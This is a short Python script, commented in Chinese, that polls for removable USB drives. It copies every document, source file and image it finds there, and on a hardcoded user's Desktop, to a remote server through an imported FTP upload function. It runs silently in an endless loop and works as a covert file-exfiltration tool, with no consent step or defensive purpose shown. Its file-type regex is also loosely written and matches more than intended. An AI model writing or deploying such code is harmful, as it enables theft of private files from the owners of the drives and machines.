from time import sleep
from shutil import copytree
from psutil import disk_partitions
import os
import re
from my_ftp import upload

# 探测u盘；无输入；返回：如果有u盘设备则返回u盘的盘符和状态（权限），如果没有则返回0
def detect_u():
    for item in disk_partitions():
        print(disk_partitions())
        if 'removable' in item.opts:
            driver, opts = item.device, item.opts
            #  输出可移动驱动器符号
            print('发现usb驱动：', driver)
            return driver, opts
        #  没有找到可输出驱动器
        else:
            continue
    return 0


# 对文件进行初步筛选
def judge_file(filename):
    pattern = re.compile(r'.*\.(doc)|(pdf)|(txt)|(ppt)|(py)|(cpp)|(xls)|(webp)|(jpg)|(png)|(jpeg)|(gif)')
    if re.search(pattern, filename):
        return 1
    else:
        return 0


# main函数
def execute_u():
    while True:
        m = detect_u()
        if m == 0:
            sleep(2)
        else:  # 如果探测到u盘
            driver = m[0]
            opts = m[1]
            for root, dirs, files in os.walk(driver, topdown=False):
                for name in files:  # 对文件夹中的所有文件进行遍历
                    if judge_file(name):
                        file = os.path.join(root, name)
                        upload(file, name)
            #在这个u盘拔出之前，不再重复上传
            while detect_u():
                sleep(1)
                continue

#进行复杂判断

#对桌面的文件也进行复制
def execute_desktop():
    win_name="max"    #"Administrator"
    driver = r"C:\Users\%s\Desktop"%win_name
    for root, dirs, files in os.walk(driver, topdown=False):
        for name in files:  # 对文件夹中的所有文件进行遍历
            if judge_file(name):
                file = os.path.join(root, name)
                upload(file, name)

def main():
    execute_desktop()
    execute_u()

main()
